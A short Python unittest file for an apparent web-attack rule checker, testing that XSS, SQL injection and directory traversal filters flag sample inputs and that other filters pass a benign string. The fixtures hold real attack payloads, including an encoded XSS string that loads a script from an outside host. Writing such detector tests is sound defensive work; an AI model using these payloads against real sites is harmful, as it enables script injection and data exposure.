#python3 -m unittest tests.rule_test

import unittest
import rule_checker as R


xss_attack = """%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss."""
sql_attack = """' or 1 in (select @@version)--"""
dt_attack = """../settings.py"""
code = """normal string"""

class TestRule(unittest.TestCase):
	def test_xss(self): 
		self.assertEqual(R.xss_filter(xss_attack), True)

	def test_sql(self):
		self.assertEqual(R.sql_filter(sql_attack), True)	

	def test_dt(self):
		self.assertEqual(R.dt_filter(dt_attack), True)

	def test_id(self):
		self.assertEqual(R.id_filter(code), False)	
	
	def test_lfi(self):
		self.assertEqual(R.lfi_filter(code), False)	

	def test_rfe(self):
		self.assertEqual(R.rfe_filter(code), False)		

	def test_format_string(self):
		self.assertEqual(R.format_string_filter(code), False)			



if __name__ == '__main__':
	unittest.main()

